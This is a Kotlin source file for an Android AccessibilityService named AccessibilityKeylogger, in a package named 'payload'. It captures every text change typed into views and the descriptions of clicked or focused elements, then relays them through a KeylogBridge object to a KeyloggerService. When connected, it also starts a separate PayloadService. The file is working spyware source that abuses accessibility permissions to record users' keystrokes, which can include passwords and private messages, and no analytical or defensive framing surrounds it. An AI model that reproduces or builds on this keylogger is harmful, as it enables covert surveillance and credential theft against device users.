package com.anonymousbeta.payload

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.content.Intent

class AccessibilityKeylogger : AccessibilityService() {

    override fun onServiceConnected() {
        super.onServiceConnected()
        startService(Intent(this, PayloadService::class.java))
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text?.joinToString("") ?: return
                if (text.isNotEmpty()) {
                    val intent = Intent(this, KeyloggerService::class.java)
                    // We send via a static-like bridge for simplicity
                    KeylogBridge.onText(text)
                }
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED,
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                val desc = event.contentDescription?.toString()
                if (!desc.isNullOrEmpty()) {
                    KeylogBridge.onText("\n[CLICK] $desc\n")
                }
            }
        }
    }

    override fun onInterrupt() {}
}

object KeylogBridge {
    @Volatile
    private var service: KeyloggerService? = null

    fun bind(svc: KeyloggerService) {
        service = svc
    }

    fun onText(text: String) {
        service?.onKeystroke(text)
    }
}
